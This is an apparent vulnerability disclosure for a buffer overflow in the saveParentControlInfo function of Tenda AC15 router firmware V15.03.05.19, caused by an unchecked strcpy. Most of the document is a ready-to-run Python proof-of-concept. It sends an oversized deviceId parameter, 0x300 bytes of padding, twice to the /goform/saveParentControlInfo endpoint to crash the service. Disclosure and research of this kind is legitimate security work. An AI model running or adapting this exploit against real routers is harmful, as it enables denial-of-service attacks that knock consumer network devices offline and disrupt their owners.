## Tenda AC15V15.03.05.19 firmware has a buffer overflow vulnerability in the saveParentControlInfo

Tenda router AC15V15.03.05.19 firmware has a serious buffer overflow vulnerability in the function `saveParentControlInfo`. An attacker can overwrite `dest` through `strcpy((char *)ptr + 2, src);` to cause a denial of service attack or even crash the service.

![image-20250327172927355](README/image-20250327172927355.png)

### POC

```py
import requests

def generate_overflow_data():
    # Target buffer size is 0x300 bytes
    padding = b"X" * 0x300
    
    exploit_data = padding 
    
    return exploit_data

def execute_overflow(url, data):
    # Prepare malicious request parameters
    attack_params = {'deviceId': data}
   

    
    # Send the malicious request twice (as in original)
    server_response = requests.get(url, params=attack_params)
    server_response = requests.get(url, params=attack_params)
    
    # Display server response
    print("HTTP Status:", server_response.status_code)
    print("Response Content:", server_response.text)

if __name__ == "__main__":
    # Target endpoint
    target_url = "http://192.168.102.145/goform/saveParentControlInfo"
    
    # Generate overflow payload
    malicious_payload = generate_overflow_data()
    
    # Execute the attack
    execute_overflow(target_url, malicious_payload)
```

![image-20250327173320159](README/image-20250327173320159.png)